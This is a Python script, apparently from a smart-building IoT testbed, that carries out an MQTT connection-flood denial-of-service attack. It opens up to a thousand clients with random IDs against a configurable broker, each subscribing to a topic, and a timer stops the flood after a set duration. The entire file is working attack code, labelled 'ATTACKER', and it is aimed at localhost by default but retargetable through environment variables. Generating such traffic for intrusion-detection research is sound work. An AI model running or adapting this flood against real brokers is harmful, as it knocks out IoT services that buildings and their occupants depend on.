import os
import datetime
import paho.mqtt.client as mqtt
import simpy.rt
import string
from random import choice, randrange

BROKER = os.getenv('SENS_BROKER', 'localhost')
PORT = os.getenv('SENS_PORT', 1883)
NAME = os.getenv('SENS_NAME', 'heavy_flood_0')
ROOM = os.getenv('SENS_ROOM', 'attack_room')
FLOOR = os.getenv('SENS_FLOOR', 'floor0')
SIM_FACTOR = float(os.getenv('SIM_FACTOR', 1))
# for infinite duration use 'inf'
SIM_DURATION = float(os.getenv('SIM_DURATION', '20'))
ATT_DURATION = float(os.getenv('ATTACK_DURATION', '10'))

attack_topic = "crazy_building/{}/{}/{}/".format(
    FLOOR, ROOM, NAME)


def main():
    starting_time = datetime.datetime.now()
    print("Simulation started at {}".format(starting_time))
    env = simpy.rt.RealtimeEnvironment(factor=SIM_FACTOR, strict=True)

    n_clients = 1000
    connect_interval = 0.01  # seconds
    print("Will create {} clients and connect all of them to the broker with {} seconds between each connection"
          .format(n_clients, connect_interval))

    attack_process = env.process(connect_flood_attack(env, n_clients, connect_interval))
    env.process(supervisor(env, attack_process, starting_time, ATT_DURATION))
    env.run(until=float(SIM_DURATION))
    print("Simulation complete")


def connect_flood_attack(env, n_clients, connect_interval):
    i = 0
    try:
        while True:
            generate_and_connect()
            i += 1
            if i >= n_clients-1:
                print("All clients connected")
                break
            yield env.timeout(connect_interval)
    except simpy.Interrupt:
        print("Attack Interrupted, {} clients connected".format(i))


def generate_and_connect():
    client = mqtt.Client(generate_ID())
    client.connect(BROKER, keepalive=600)
    client.subscribe(attack_topic)
    client.loop_start()


def supervisor(env, attack_process, starting_time, attack_duration):
    print("Heavy flood starts now, will last {} sim. seconds".format(attack_duration))
    yield env.timeout(attack_duration)
    try:
        attack_process.interrupt()
    except RuntimeError:
        pass


def generate_ID():
    return 'CL-' + \
           FLOOR[::len(FLOOR) - 1] + '-' + ROOM[::len(ROOM) - 1] + '-' + \
           NAME + \
           ''.join(choice(string.ascii_lowercase) for i in range(randrange(5, 15)))


if __name__ == "__main__":
    print("+++ ATTACKER +++")
    main()
